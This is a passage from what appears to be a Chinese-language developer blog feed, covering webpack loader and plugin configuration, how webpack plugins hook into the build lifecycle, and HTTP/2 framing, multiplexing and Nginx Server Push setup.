class="attribute">sassOptions</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">                <span class="attribute">includePaths</span><span class="punctuation">:</span> <span class="string">[__dirname]</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="支持-Less"><a href="#支持-Less" class="headerlink" title="支持 Less"></a>支持 Less</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add -D <span class="keyword">less</span> <span class="keyword">less</span>-loader</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="regexp">//</span> ...</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              modules: &#123;</span><br><span class="line">                compileType: <span class="string">&#x27;icss&#x27;</span>,</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">&#x27;less-loader&#x27;</span>,</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="让-less-自动-import"><a href="#让-less-自动-import" class="headerlink" title="让 less 自动 import"></a>让 less 自动 import</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">module.exports = &#123;</span></span><br><span class="line"><span class="attribute">  // ...</span></span><br><span class="line"><span class="attribute">  module</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">    <span class="attribute">rules</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">      <span class="attribute">// ...</span></span><br><span class="line"><span class="attribute">      &#123;</span></span><br><span class="line"><span class="attribute">        test</span><span class="punctuation">:</span> <span class="string">/\.less$/,</span></span><br><span class="line">        <span class="attribute">use</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">          <span class="attribute">&#x27;style-loader&#x27;,</span></span><br><span class="line"><span class="attribute">          &#123;</span></span><br><span class="line"><span class="attribute">            loader</span><span class="punctuation">:</span> <span class="string">&#x27;css-loader&#x27;,</span></span><br><span class="line">            <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">              <span class="attribute">modules</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">                <span class="attribute">compileType</span><span class="punctuation">:</span> <span class="string">&#x27;icss&#x27;,</span></span><br><span class="line">              <span class="attribute">&#125;</span></span><br><span class="line"><span class="attribute">            &#125;,</span></span><br><span class="line"><span class="attribute">          &#125;,</span></span><br><span class="line"><span class="attribute">          &#123;</span></span><br><span class="line"><span class="attribute">            loader</span><span class="punctuation">:</span> <span class="string">&#x27;less-loader&#x27;,</span></span><br><span class="line">            <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">              <span class="attribute">additionalData</span><span class="punctuation">:</span> <span class="string">`@import &quot;~@/less-vars.less&quot;;`,</span></span><br><span class="line">              <span class="attribute">lessOptions</span><span class="punctuation">:</span> <span class="string">&#123;</span></span><br><span class="line">                <span class="attribute">includePaths</span><span class="punctuation">:</span> <span class="string">[__dirname]</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分享-Less-变量给-JS"><a href="#分享-Less-变量给-JS" class="headerlink" title="分享 Less 变量给 JS"></a>分享 Less 变量给 JS</h1><blockquote><p>和 scss 同理</p></blockquote><h1 id="支持-stylus"><a href="#支持-stylus" class="headerlink" title="支持 stylus"></a>支持 stylus</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="built_in">add</span> -D stylus stylus-loader</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="regexp">//</span> ...</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      <span class="regexp">//</span> ...</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.styl(us)?$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              modules: &#123;</span><br><span class="line">                compileType: <span class="string">&#x27;icss&#x27;</span>,</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">&#x27;stylus-loader&#x27;</span>,</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="让-stylus-自动-import"><a href="#让-stylus-自动-import" class="headerlink" title="让 stylus 自动 import"></a>让 stylus 自动 import</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        test: /\.<span class="built_in">styl</span>(us)?$/,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              modules: &#123;</span><br><span class="line">                compileType: <span class="string">&#x27;icss&#x27;</span>,</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">&#x27;stylus-loader&#x27;</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              stylusOptions: &#123;</span><br><span class="line">                import: [path.<span class="built_in">resolve</span>(__dirname, <span class="string">&#x27;src/stylus-vars.styl&#x27;</span>)]</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure><h1 id="分享-stylus-变量给-JS"><a href="#分享-stylus-变量给-JS" class="headerlink" title="分享 stylus 变量给 JS"></a>分享 stylus 变量给 JS</h1><blockquote><p>同理</p></blockquote><h1 id="提取-CSS，并且文件加-hash"><a href="#提取-CSS，并且文件加-hash" class="headerlink" title="提取 CSS，并且文件加 hash"></a>提取 CSS，并且文件加 hash</h1><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --<span class="built_in">save</span>-<span class="built_in">dev</span> mini-css-extract-plugin</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new <span class="built_in">MiniCssExtractPlugin</span>(&#123;</span><br><span class="line">      filename: <span class="string">&#x27;[name].[contenthash].css&#x27;</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const createLoader = <span class="function"><span class="params">(...loaders)</span> =&gt;</span> [</span><br><span class="line">  mode === <span class="string">&#x27;production&#x27;</span> ?</span><br><span class="line">    MiniCssExtractPlugin.loader:</span><br><span class="line">    <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    loader: <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      modules: &#123;</span><br><span class="line">        compileType: <span class="string">&#x27;icss&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  ...loaders</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="自动生成-HTML"><a href="#自动生成-HTML" class="headerlink" title="自动生成 HTML"></a>自动生成 HTML</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="built_in">add</span> -D html-webpack-plugin</span><br></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: <span class="type"></span>[</span><br><span class="line">    <span class="keyword">new</span> <span class="type">HtmlWebpackPlugin</span>()</span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><h1 id="给-JS-文件加-hash"><a href="#给-JS-文件加-hash" class="headerlink" title="给 JS 文件加 hash"></a>给 JS 文件加 hash</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = &#123;</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">&#x27;[name].[contenthash].js&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack plugn 插件原理</title>
      <link href="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/"/>
      <url>/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/</url>
      
        <content type="html"><![CDATA[<p>从上文提炼出 webpack 的一些主要流程</p><blockquote><p>init &#x3D;&gt; run(前两个一般不用) &#x3D;&gt; compile(编译开始的时候) &#x3D;&gt; compilation(准备编译的整个过程) &#x3D;&gt; make(开始编译) &#x3D;&gt; afterCompile(编译结束) &#x3D;&gt; seal(对代码进行封装，比如优化、合并…) &#x3D;&gt; codeGenerate(生成代码) &#x3D;&gt; emit(发射，把文件写到硬盘里面) &#x3D;&gt; done</p></blockquote><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img.png"></p><h2 id="插件，就是找个地方插进去"><a href="#插件，就是找个地方插进去" class="headerlink" title="插件，就是找个地方插进去"></a>插件，就是找个地方插进去</h2><p>比如：<a href="https://github.com/Klathmon/imagemin-webpack-plugin">imagemin-webpack-plugin</a> 、<a href="https://github.com/johnagan/clean-webpack-plugin">clean-webpack-plugin</a></p><h2 id="imagemin-webpack-plugin"><a href="#imagemin-webpack-plugin" class="headerlink" title="imagemin-webpack-plugin"></a>imagemin-webpack-plugin</h2><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_1.png"></p><ul><li>这是一个压缩图片的插件</li><li>文件目录非常简单</li><li>主要看 apply 这个函数</li><li>根据看源码的步骤，跳过声明</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_2.png"></p><ul><li>直接看最后的 if else，因为我们一般使用的是 webpack 4 以上的版本，所以进入 compiler.hooks 分支（见代码备注）</li><li>发现他监听了 emit 这个事件</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_3.png"></p><ul><li>直接看函数名字我们就能知道他的主要功能（优化项目中图片和其他外部图片）</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_4.png"></p><ul><li>对 compilation.assets （此次编译的文件）进行 map 操作，用 testFunction 判断是否是图片文件，然后执行 optimizeImage 这个方法进行图片优化（这里用到了 imagemin 这个库）</li></ul><blockquote><p>这个插件非常简单</p></blockquote><h2 id="clean-webpack-plugin"><a href="#clean-webpack-plugin" class="headerlink" title="clean-webpack-plugin"></a>clean-webpack-plugin</h2><ul><li>这是一个清理 webpack 的输出目录的插件</li><li><strong>分析这个插件之前，我们先思考如果我们要写这个插件，我们应该监听哪个钩子函数？</strong>如果是init 可能可以？但是有点不妥，因为有可能初始化的过程中会报错，这样就不会产生新的文件，所以就没有必要清除之前的文件</li><li>很显然我们应该在 emit （写文件之前）去清理文件</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_5.png"></p><ul><li>果然他也是在监听 emit，从而去执行 handleInitial 和 removeFiles（看函数名字就知道了，这俩函数逻辑非常简单，这里暂不分析了）</li><li>但是细心的你肯定也发现了，为什么下面他还监听了 done？</li><li>因为可能 emit 的时候也会产生一些垃圾、临时文件，所以也需要清理</li></ul><h2 id="ProvidePlugin"><a href="#ProvidePlugin" class="headerlink" title="ProvidePlugin"></a><a href="https://webpack.js.org/plugins/provide-plugin/">ProvidePlugin</a></h2><ul><li>这个插件主要用于注入全局变量，比如说每个文件都需要用到 JQuery，你需要每个文件都引入，<br>用这个插件他会帮你自动引入，你直接用就好了</li><li>使用方法很简单</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_6.png"></p><ul><li>在选项中声明好，只要你用到了 $ 或者 JQuery，就会自动引入 JQuery</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_7.png"></p><ul><li><p>vue 同理</p></li><li><p><strong>同样，如果是我们写这个插件，我们应该监听哪个钩子函数？</strong></p></li><li><p>猜测应该是在 compilation 或者 make 阶段</p></li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_8.png"></p><ul><li>这个插件就不一样了，他主要监听的是 nft 的 parse 阶段</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_9.png"></p><ul><li>我们来看这个 handle 函数做了什么</li><li>遍历了 definition （就是选项哪个对象: {$: ‘jquery’, vue: [….]}）</li><li>分析所有的表达式（expression），如果你用到了哪些，就帮你直接在依赖中添加（等价于帮你自动 import）</li><li>主要思路</li></ul><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_10.png"></p><blockquote><p>正式因为插件可以在任何阶段进行魔改，所以 webpack 功能非常强大</p></blockquote><h3 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h3><p><a href="https://www.html.cn/web/javascript/19320.html">18个常用 webpack插件，总会有适合你的！</a></p><h2 id="loader-与-plugin-的区别"><a href="#loader-与-plugin-的区别" class="headerlink" title="loader 与 plugin 的区别"></a>loader 与 plugin 的区别</h2><ul><li>loader 是在 make 阶段执行的，而 plugin 可以在任何一个阶段插入，两者之间没有关系</li><li><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/308">webpack 中 loader 和 plugin 的区别是什么</a></li><li>截取一个最高赞的分析一下</li><li><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_11.png"></li></ul><blockquote><p>loader 没啥问题，就是转换文件<br><em>它丰富了webpack本身</em>（难道 loader 没有丰富 webpack 吗？）<br><em>针对是loader结束后</em>（plugin 可以对任何阶段进行操作）<br><em>它并不直接操作文件</em>（他可以直接操作文件，甚至可以删文件）<br><strong>就这些修正</strong></p></blockquote><h4 id="loader-比较简单，在-make-阶段中执行，单纯的文件转换过程，而-plugin-他是对-webpack-的功能进行拓展，他是基于事件机制，对-webpack-的每个阶段都可以进行介入，做一些功能（任何你想做的）。"><a href="#loader-比较简单，在-make-阶段中执行，单纯的文件转换过程，而-plugin-他是对-webpack-的功能进行拓展，他是基于事件机制，对-webpack-的每个阶段都可以进行介入，做一些功能（任何你想做的）。" class="headerlink" title="loader 比较简单，在 make 阶段中执行，单纯的文件转换过程，而 plugin 他是对 webpack 的功能进行拓展，他是基于事件机制，对 webpack 的每个阶段都可以进行介入，做一些功能（任何你想做的）。"></a>loader 比较简单，在 make 阶段中执行，单纯的文件转换过程，而 plugin 他是对 webpack 的功能进行拓展，他是基于事件机制，对 webpack 的每个阶段都可以进行介入，做一些功能（任何你想做的）。</h4><h2 id="如何自己写一个-plugin"><a href="#如何自己写一个-plugin" class="headerlink" title="如何自己写一个 plugin"></a>如何自己写一个 plugin</h2><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_12.png"></p><ul><li><p>必须名声一个 class</p></li><li><p>必须有一个 apply 函数，并且接受一个 compiler 参数</p></li><li><p>接下来对某一个钩子进行监听，在写你的主要逻辑</p></li><li><p>举例</p></li><li><p><img src="/Blog/2021/05/06/javascript/webpack-plugn%E6%8F%92%E4%BB%B6%E5%8E%9F%E7%90%86/index/img_13.png"></p></li><li><p>一个简单的在 done 之后打印一句话，和使用方法</p></li><li><p><strong>用到的主要知识</strong></p></li><li><p>对 webpack hooks 的了解</p></li><li><p>对编译原理的了解</p></li><li><p>对 chunk、hash、module、dep、factor 等概念的理解</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web性能优化-什么是多路复用</title>
      <link href="/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/"/>
      <url>/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/</url>
      
        <content type="html"><![CDATA[<h2 id="1-HTTP-x2F-2-的帧与流等概念"><a href="#1-HTTP-x2F-2-的帧与流等概念" class="headerlink" title="1.  HTTP&#x2F;2 的帧与流等概念"></a>1.  HTTP&#x2F;2 的帧与流等概念</h2><blockquote><p>HTTP&#x2F;2 是基于二进制帧（Frame），他将一个TCP连接分为若干个流（Stream），每个流中可以传输若干消息（Message），每个消息由若干最小的二进制帧（Frame）组成。</p></blockquote><blockquote><p><em>科普：什么是二进制？如果一个二进制人类看得懂，那他就是字符串，否则就是二进制</em></p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">-------------------</span></span><br><span class="line"><span class="code">| Length | Type   |</span></span><br><span class="line"><span class="code">-------------------</span></span><br><span class="line"><span class="section">| Flag | StreamID |</span></span><br><span class="line"><span class="section">-------------------</span></span><br><span class="line"><span class="section">|   Payload       |</span></span><br><span class="line"><span class="section">-------------------</span></span><br></pre></td></tr></table></figure><blockquote><p>前面九个字节代表 Length (长度)、Type (类型)、Flags (标记位)、StreamID (所在流的 ID)，第五部分 Payload (数据)，一般为16 K - 16 M（这里说的数据不只是请求体，包含了从 HTTP 请求头开始的所有）</p></blockquote><h3 id="与-HTTP-x2F-1-的区别"><a href="#与-HTTP-x2F-1-的区别" class="headerlink" title="与 HTTP&#x2F;1.* 的区别"></a>与 HTTP&#x2F;1.* 的区别</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p><img src="/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/img.png"></p><ol><li>这里假设是一个 Frame，前面这个框代表前九个字节</li><li>header 代表这是请求头</li><li>+ (true) 号代表当前这部分结束</li><li>冒号开头的表示伪头，h2 现在用这三行表示为以前的请求头第一部分</li><li>以前的冒号变成了等于号（因为冒号被占用了）</li><li>大写变成了小写，不允许小写</li></ol><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p><img src="/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/img_1.png"></p><ol><li>至少三个 Frame</li><li>第一个 Frame，- END_STREAM 表示请求没有结束，- END_HEADERS 表示请求头也没有结束</li><li>第二个 Frame，COUTINUATION 表示这是一个继续，要和前面一个一起看，+ END_HEADERS 到我这一帧，请求头结束了</li><li>以前请求的第三部分（回车），到 h2 就不需要了，删除了</li><li>DATA 数据，+ END_STREAM 代表请求到这里都结束了</li></ol><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><p><img src="/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/img_2.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>基本没什么区别，只不过是吧以前一个请求、一个响应变成了不同的帧，让那九个字节关联起所有的帧，还有伪头的概念</p></blockquote><h2 id="2-HTTP-x2F-2的流与多路复用"><a href="#2-HTTP-x2F-2的流与多路复用" class="headerlink" title="2. HTTP&#x2F;2的流与多路复用"></a>2. HTTP&#x2F;2的流与多路复用</h2><ol><li>上次说到 HTTP&#x2F;1.1 管道的概念，之所以不能使用就是因为响应的时候必须要按顺序</li><li>但是在 HTTP&#x2F;2 中就没有这个问题了，他每个响应都会告诉你对应的是哪个，因为他有前面 9 个字节可以做标记，所以在管道中每个请求响应都是独立的，大大的提升了效率</li><li>但是 H2 并不仅仅是加了标记，由于顺序是乱的，所以请求方需要去做一个整合，响应方 Frame 太多了请求方一般还一般需要压缩在发送</li><li>有了多路复用以后，以前的并行方案就没有必要了，并行的话还要多开好几个连接</li><li>一个管道中能开多少个“路”呢？答案是 100 可以， 1000 个也可以，一般来说 100 都算少的，所以他的效率是极高的</li></ol><h2 id="3-HTTP-x2F-2-的-Server-Push-的利与弊"><a href="#3-HTTP-x2F-2-的-Server-Push-的利与弊" class="headerlink" title="3.  HTTP&#x2F;2 的 Server Push 的利与弊"></a>3.  HTTP&#x2F;2 的 Server Push 的利与弊</h2><blockquote><p>先说结论，我们实际生活中并不会或者说很少使用到这个功能</p></blockquote><ol><li>首先客户端还是需要先发送第一个请求</li><li>但是此时服务器会主动多返回一些东西回来</li><li>当客户端再需要请求这些文件的时候，就会发现已经有了，就不再请求了</li></ol><p><img src="/Blog/2021/04/22/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/index/img_3.png"></p><h4 id="那么问题来了，服务器怎么知道客户端需要哪些东西呢？"><a href="#那么问题来了，服务器怎么知道客户端需要哪些东西呢？" class="headerlink" title="那么问题来了，服务器怎么知道客户端需要哪些东西呢？"></a>那么问题来了，服务器怎么知道客户端需要哪些东西呢？</h4><blockquote><p>答案是程序员认为去提前写好的</p></blockquote><h3 id="配置-Server-Push"><a href="#配置-Server-Push" class="headerlink" title="配置 Server Push"></a>配置 Server Push</h3><h4 id="方法一：Nginx"><a href="#方法一：Nginx" class="headerlink" title="方法一：Nginx"></a>方法一：Nginx</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Nginx</span></span><br><span class="line">location &#123;</span><br><span class="line">  root   /usr/share/nginx*<span class="selector-tag">html</span></span><br><span class="line">  index  index<span class="selector-class">.html</span> index<span class="selector-class">.htm</span></span><br><span class="line">  http2_push  /style<span class="selector-class">.css</span></span><br><span class="line">  http2_push  /example<span class="selector-class">.css</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法二：Nginx-和-响应头"><a href="#方法二：Nginx-和-响应头" class="headerlink" title="方法二：Nginx 和 响应头"></a>方法二：Nginx 和 响应头</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Nginx</span><br><span class="line"><span class="keyword">location</span> <span class="title">= / &#123;</span></span><br><span class="line"><span class="title">  ...</span></span><br><span class="line"><span class="title">  http2_push_preload</span> on</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// <span class="keyword">index</span>.html 响应头</span><br><span class="line"><span class="keyword">Link</span>: &lt;/style.css&gt;; rel=preload; <span class="keyword">as</span>=style</span><br></pre></td></tr></table></figure><ol><li>一般这样的配置非常繁琐，如果文件名称变动，还需要后台配合来改配置，一般没人会这么做</li><li>还有现在的前端都是工程化了，文件名一般都是混合了哈希，后端根本不知道文件名</li><li>所以几乎没有人用</li><li>当然 Server Push 很好，可以提前响应，但是现实状况是后台不知道提前去响应什么</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>阅读 webpack 源码</title>
      <link href="/Blog/2021/04/22/javascript/%E9%98%85%E8%AF%BBwebpack%E6%BA%90%E7%A0%81/index/"/>
      <url>/Blog/2021/04/22/javascript/%E9%98%85%E8%AF%BBwebpack%E6%BA%90%E7%A0%81/index/</url>
      
